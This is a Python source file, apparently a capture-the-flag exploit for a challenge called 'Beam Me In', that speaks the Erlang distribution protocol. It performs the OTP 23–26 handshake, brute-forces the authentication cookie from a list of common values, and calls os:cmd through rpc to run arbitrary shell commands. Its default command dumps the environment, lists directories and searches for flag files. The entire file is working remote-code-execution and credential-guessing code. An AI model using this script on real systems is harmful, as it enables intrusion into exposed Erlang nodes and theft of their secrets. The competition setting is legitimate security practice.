#!/usr/bin/env python3
# Erlang distribution RCE for "Beam Me In" (RowdyHacks).
# Connects through rowdy_tunnel.py (127.0.0.1:2222) to the exposed node's
# distribution port, does the OTP-23..26 handshake with a fresh node-name
# ("token") each run, authenticates with the magic cookie, then calls
# rpc -> os:cmd/1 to run shell commands.  Pure stdlib.
#
# USAGE:
#   python3 erl_pwn.py --recon                 # confirm it's a dist node, leak node name (no cookie needed)
#   python3 erl_pwn.py --brute                 # try a list of common cookies
#   python3 erl_pwn.py -c COOKIE "id; ls -la /"# run a shell command
#   python3 erl_pwn.py -c COOKIE               # run the default flag-hunt command
#   python3 erl_pwn.py --cookies file.txt      # brute from a custom cookie file
#
import socket, struct, os, sys, hashlib, random, string, argparse

HOST_DEFAULT, PORT_DEFAULT = "127.0.0.1", 2222

# --- distribution capability flags (OTP 23..26 mandatory set) ---
EXTENDED_REFERENCES=0x4; FUN_TAGS=0x10; EXTENDED_PID_PORTS=0x100
NEW_FUN_TAGS=0x80; EXPORT_PTR_TAG=0x200; BIT_BINARIES=0x400
NEW_FLOATS=0x800; UTF8_ATOMS=0x10000; MAP_TAG=0x20000
BIG_CREATION=0x40000; HANDSHAKE_23=0x1000000; V4_NC=(1<<34)
FLAGS = (EXTENDED_REFERENCES|FUN_TAGS|EXTENDED_PID_PORTS|NEW_FUN_TAGS|
         EXPORT_PTR_TAG|BIT_BINARIES|NEW_FLOATS|UTF8_ATOMS|MAP_TAG|
         BIG_CREATION|HANDSHAKE_23|V4_NC)

COMMON_COOKIES = ["", "cookie", "secret", "SECRET", "erlang", "SECRET_COOKIE",
    "changeme", "password", "rowdyhacks", "rowdy", "RowdyHacks", "bitnodo",
    "beam", "beammein", "monster", "nocookie", "rabbit", "admin", "flag"]

DEFAULT_CMD = ("id; echo '==UNAME=='; uname -a; echo '==LS/=='; ls -la /; "
    "echo '==APP=='; ls -la /app 2>/dev/null; echo '==ENV=='; env; "
    "echo '==FLAG=='; cat /flag* /app/flag* ./flag* 2>/dev/null; "
    "find / -maxdepth 5 -iname '*flag*' 2>/dev/null | head -n 50")

def recvn(s,n):
    b=b""
    while len(b)<n:
        c=s.recv(n-len(b))
        if not c: raise EOFError("connection closed")
        b+=c
    return b

def recv_hs(s):
    ln=struct.unpack(">H",recvn(s,2))[0]; return recvn(s,ln)
def send_hs(s,d):
    s.sendall(struct.pack(">H",len(d))+d)
def digest(ch,cookie):
    return hashlib.md5(cookie.encode()+str(ch).encode()).digest()  # ch unsigned decimal

def rand_name():
    return "pwn"+"".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(13))

def handshake(s, myname, cookie):
    creation=random.randint(1,0x7ffffffe)
    nm=myname.encode()
    send_hs(s, b"N"+struct.pack(">Q",FLAGS)+struct.pack(">I",creation)+struct.pack(">H",len(nm))+nm)
    st=recv_hs(s)
    if st[:1]!=b"s": raise Exception("unexpected status frame: %r"%st)
    status=st[1:].decode("latin1","replace")
    ch=recv_hs(s)
    if ch[:1]!=b"N": raise Exception("unexpected challenge tag %r (not a v6 dist node?)"%ch[:1])
    peer_flags=struct.unpack(">Q",ch[1:9])[0]
    peer_ch=struct.unpack(">I",ch[9:13])[0]
    nlen=struct.unpack(">H",ch[17:19])[0]
    peer_name=ch[19:19+nlen].decode("latin1","replace")
    my_ch=random.randint(0,0xffffffff)
    send_hs(s, b"r"+struct.pack(">I",my_ch)+digest(peer_ch,cookie))
    ack=recv_hs(s)
    if ack[:1]!=b"a":
        raise Exception("no challenge_ack (wrong cookie?) got %r"%ack[:1])
    if ack[1:17]!=digest(my_ch,cookie):
        raise Exception("ack digest mismatch -> WRONG COOKIE")
    return peer_name, peer_flags, creation, status

# --- minimal ETF encoders (no 131 prefix; added per-term for 'p' passthrough) ---
def A(n):                                  # atom (utf8)
    b=n.encode(); return b"v"+struct.pack(">H",len(b))+b
def I1(n): return bytes([97,n&0xff])       # small int
def STR(b): return b"k"+struct.pack(">H",len(b))+b           # string/charlist
def LIST(items): return b"l"+struct.pack(">I",len(items))+b"".join(items)+b"j"
def TUP(items): return bytes([104,len(items)])+b"".join(items)
def PID(node,idv,ser,cre): return b"X"+A(node)+struct.pack(">I",idv)+struct.pack(">I",ser)+struct.pack(">I",cre)
def REF(node,cre,ids): return b"Z"+struct.pack(">H",len(ids))+A(node)+struct.pack(">I",cre)+b"".join(struct.pack(">I",x) for x in ids)
def T(x): return b"\x83"+x                  # version-tagged term

# --- tiny ETF decoder (enough to pull os:cmd output out of the reply) ---
def dec(b,i):
    t=b[i]; i+=1
    if t==131: return dec(b,i)
    if t==97:  return b[i],i+1
    if t==98:  return struct.unpack(">i",b[i:i+4])[0],i+4
    if t in (118,100): ln=struct.unpack(">H",b[i:i+2])[0]; i+=2; return ("atom",b[i:i+ln].decode("latin1")),i+ln
    if t in (119,115): ln=b[i]; i+=1; return ("atom",b[i:i+ln].decode("latin1")),i+ln
    if t==106: return [],i
    if t==107: ln=struct.unpack(">H",b[i:i+2])[0]; i+=2; return list(b[i:i+ln]),i+ln   # string -> list of ints
    if t==108:
        n=struct.unpack(">I",b[i:i+4])[0]; i+=4; out=[]
        for _ in range(n): v,i=dec(b,i); out.append(v)
        _,i=dec(b,i); return out,i
    if t==109: ln=struct.unpack(">I",b[i:i+4])[0]; i+=4; return b[i:i+ln],i+ln          # binary
    if t in (104,105):
        if t==104: ar=b[i]; i+=1
        else: ar=struct.unpack(">I",b[i:i+4])[0]; i+=4
        out=[]
        for _ in range(ar): v,i=dec(b,i); out.append(v)
        return tuple(out),i
    if t==88: _,i=dec(b,i); return ("pid",),i+12
    if t==90: n=struct.unpack(">H",b[i:i+2])[0]; i+=2; _,i=dec(b,i); return ("ref",),i+4+4*n
    if t==70: return struct.unpack(">d",b[i:i+8])[0],i+8
    if t in (110,111):
        if t==110: n=b[i]; i+=1
        else: n=struct.unpack(">I",b[i:i+4])[0]; i+=4
        i+=1+n; return ("big",),i
    raise Exception("ETF tag %d not handled at %d"%(t,i))

def to_text(x):
    if isinstance(x,(bytes,bytearray)): return bytes(x).decode("utf-8","replace")
    if isinstance(x,list) and all(isinstance(e,int) and 0<=e<256 for e in x):
        return bytes(x).decode("utf-8","replace")
    return repr(x)

def run_cmd(host,port,cookie,cmd,verbose=False):
    s=socket.create_connection((host,port),timeout=15)
    myname=rand_name()+"@127.0.0.1"
    peer,flags,cre,status=handshake(s,myname,cookie)
    if verbose: print("[+] handshake ok  peer=%s  status=%s"%(peer,status))
    frompid=PID(myname,random.randint(1,0x3fff),0,cre)
    ref=REF(myname,cre,[random.getrandbits(32) for _ in range(3)])
    control=TUP([I1(6),frompid,A(""),A("rex")])                 # REG_SEND -> 'rex'
    msg=TUP([A("$gen_call"),TUP([frompid,ref]),
             TUP([A("call"),A("os"),A("cmd"),LIST([STR(cmd.encode())]),frompid])])
    payload=b"p"+T(control)+T(msg)
    s.sendall(struct.pack(">I",len(payload))+payload)
    # read reply (skip ticks)
    while True:
        ln=struct.unpack(">I",recvn(s,4))[0]
        if ln==0: continue
        data=recvn(s,ln)
        if data[:1]!=b"p": continue
        j=1
        _,j=dec(data,j)        # control
        m,_=dec(data,j)        # message = {Ref, Output}
        s.close()
        if isinstance(m,tuple) and len(m)>=2:
            return to_text(m[-1])
        return to_text(m)

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("cmd",nargs="?",default=DEFAULT_CMD)
    ap.add_argument("-c","--cookie")
    ap.add_argument("--recon",action="store_true")
    ap.add_argument("--brute",action="store_true")
    ap.add_argument("--cookies")
    ap.add_argument("--host",default=HOST_DEFAULT); ap.add_argument("--port",type=int,default=PORT_DEFAULT)
    a=ap.parse_args()

    if a.recon:
        s=socket.create_connection((a.host,a.port),timeout=15)
        try:
            peer,flags,_,status=handshake(s,rand_name()+"@127.0.0.1","recon-nocookie")
        except Exception as e:
            # handshake fails at ack without the cookie, but we still printed what we need
            print("[i] reached challenge stage (cookie needed for full auth): %s"%e); return
        print("[+] node name:",peer,"status:",status,"flags:0x%x"%flags); return

    cookies=[a.cookie] if a.cookie else None
    if a.cookies:
        cookies=[l.rstrip("\n") for l in open(a.cookies)]
    if cookies is None and (a.brute or not a.cookie):
        cookies=COMMON_COOKIES
    if a.cookie:
        out=run_cmd(a.host,a.port,a.cookie,a.cmd,verbose=True); print(out); return
    # brute
    for ck in cookies:
        try:
            out=run_cmd(a.host,a.port,ck,a.cmd,verbose=False)
            print("[+] COOKIE FOUND: %r"%ck); print(out); return
        except Exception as e:
            print("[-] cookie %-16r -> %s"%(ck,e))
    print("[!] no cookie worked. Find it (app source/env) and pass with -c COOKIE")

if __name__=="__main__":
    main()
